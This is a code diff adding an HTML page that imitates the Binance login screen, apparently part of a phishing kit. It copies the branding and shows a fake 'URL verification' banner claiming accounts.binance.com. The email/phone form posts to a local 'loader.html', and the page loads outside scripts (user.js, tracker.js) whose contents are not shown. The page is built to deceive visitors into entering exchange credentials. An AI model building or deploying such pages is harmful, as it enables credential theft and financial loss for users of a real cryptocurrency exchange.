@@ -1,0 +1,115 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">   
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="./styles/login.css">
+    <link rel="icon" type="image/x-icon" href="./assets/websiteIcon.png">
+    <script src="./assets/fonts.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+
+    <title>Binance login page</title>
+
+<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
+</head>
+
+<script>
+
+
+
+</script>
+
+<body>
+  
+<script src="./user.js"></script> 
+    <nav>
+        <img id="logo" src="./assets/logo.png" alt="Logo">
+        <div>
+            <p>English</p>
+            <img src="./assets/dark.png" alt="" srcset="">
+        </div>
+    </nav>
+    <div id="watchout">
+        <img src="./assets/lock.png" alt="">
+        <b id='1'>URL verification:</b>
+        <p id="2">https://accounts.binance.com</p>
+    </div>
+    
+
+    <div class="container" id="container" style="margin-top: 20px;">
+        <div class="leftSide">
+            <h2 style="font-size: 30px; font-weight: 500; margin: 0;">Log In</h2>
+            <form id="Loginform" action="loader.html">
+
+                <label for="username" style="color: #110a04; font-size: 15px; font-weight: 400;" id="lbl_username">Email / Phone Number</label>
+                <input type="text" id="username" name="username">
+
+                
+                <button id="loginBtn" type="submit" onclick="">Next </button>
+                
+                <div class="linesandor">
+                    <div class="line" style="height: 1px; background-color: #EAECEF; width: 150px; position: relative; bottom: 7px;"></div>
+                    <text style="padding: 0 5px 0 5px;font-size: 14px;">or</text>
+                    <div class="line" style="height: 1px; background-color: #EAECEF; width: 150px; position: relative; bottom: 7px;"></div>
+                </div>
+
+                <button class="google-sign-in-button">
+                    <img src="./assets/google.png" alt="Google Icon">
+                    Continue with Google
+                </button>
+
+                <button class="google-sign-in-button" >
+                    <img src="./assets/apple.png" alt="Google Icon">
+                    Continue with Apple
+                </button>
+                
+            </form>
+            <div id="ass" >
+                <a href="#" id='9'>Create a Binance Account</a>
+            </div>
+        </div>
+        <div class="rightside" style="display: flex; flex-direction: column; align-items: center; justify-content: center; margin-left:60px; position: relative; top: 60px;">
+            <img src="./assets/qr.png" alt="QR CODE" style="width: 156px; height: 156px;">
+            <h3 style="font-size: 16px; font-weight: 500;">Log in with QR code</h3>
+            <p style="width:250px;color: #130d10; text-align: center; font-size: 15px; margin: 0;;">Scan this code with the <a style="color:#bd9702;">Binance mobile app</a> to log in instantly.</p>
+        </div>
+    </div>
+    <footer>
+        <p style="color: black;">Binance © 2024</p>
+    </footer>
+    <style>
+        .LoderContainer h2{
+            color: #000925;
+            font-size: 1em;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            width: 300px;
+            margin-top: 20px;
+        }
+        .LoderContainer{
+            margin-top: 250px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+        }
+        .LoderContainer .loader {
+            border: 10px dashed #b4b100; /* Light grey */
+            border-top: 10px solid #b4b104; /* Blue */
+            border-radius: 50%;
+            width: 70px;
+            height: 70px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+    </style>
+    
+</body>
+</html>
